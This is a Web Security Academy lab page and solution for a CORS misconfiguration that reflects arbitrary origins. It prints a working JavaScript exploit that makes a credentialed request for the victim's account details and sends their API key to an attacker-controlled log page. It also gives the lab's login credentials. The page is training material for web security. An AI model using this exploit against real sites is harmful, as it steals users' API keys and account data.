# Lab: CORS vulnerability with basic origin reflection

Source: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
Fetched: 2026-06-28T09:17:43.119372+00:00

Web Security Academy

CORS

Lab

Lab: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Solution

Check intercept is off, then use the browser to log in and access your account page.

Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.

Send the request to Burp Repeater, and resubmit it with the added header:

Origin: https://example.com

Observe that the origin is reflected in the Access-Control-Allow-Origin header.

In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL:

<script>

var req = new XMLHttpRequest();

req.onload = reqListener;

req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);

req.withCredentials = true;

req.send();

function reqListener() {

location='/log?key='+this.responseText;

};

</script>

Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.

Go back to the exploit server and click Deliver exploit to victim.

Click Access log, retrieve and submit the victim's API key to complete the lab.

Community solutions

Rana Khalil

Popo Hack

Find CORS vulnerabilities using Burp Suite

Try for free
